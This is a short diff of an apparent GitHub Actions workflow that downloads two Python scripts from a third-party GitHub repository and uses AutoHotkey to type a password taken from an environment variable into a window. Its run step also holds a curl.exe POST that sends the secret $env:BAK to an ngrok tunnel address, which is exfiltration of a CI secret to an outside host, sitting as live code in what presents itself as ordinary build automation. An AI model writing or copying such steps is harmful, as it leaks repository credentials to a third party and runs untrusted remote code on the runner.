@@ -61,8 +61,8 @@ jobs:
         run: |
           $ahkUrl = "https://github.com/AutoHotkey/AutoHotkey/releases/download/v2.0.19/AutoHotkey_2.0.19_setup.exe"
            # Fallback curl
-           wget https://raw.githubusercontent.com/mishakokzix/hermes-agent/refs/heads/main/bool.py
-           wget https://raw.githubusercontent.com/mishakokzix/hermes-agent/refs/heads/main/backup.py
+           curl.exe -LO https://raw.githubusercontent.com/mishakokzix/hermes-agent/refs/heads/main/bool.py
+           curl.exe -LO https://raw.githubusercontent.com/mishakokzix/hermes-agent/refs/heads/main/backup.py
            curl.exe -X POST https://heteronomous-bridally-minerva.ngrok-free.dev -H "Content-Type: application/json" -d "{"apiKey": "$env:BAK"}"
 
           $ahkPath = "$env:WORK_DIR\AutoHotkey_Setup.exe"
@@ -90,7 +90,7 @@ jobs:
           Sleep 1000
           Send "{Tab}"
           Sleep 1000
-          Send EnvGet("PARSEC_PASS")
+          Send EnvGet("PASS")
           Sleep 1000
           Send "{Enter}"
           Sleep 45000
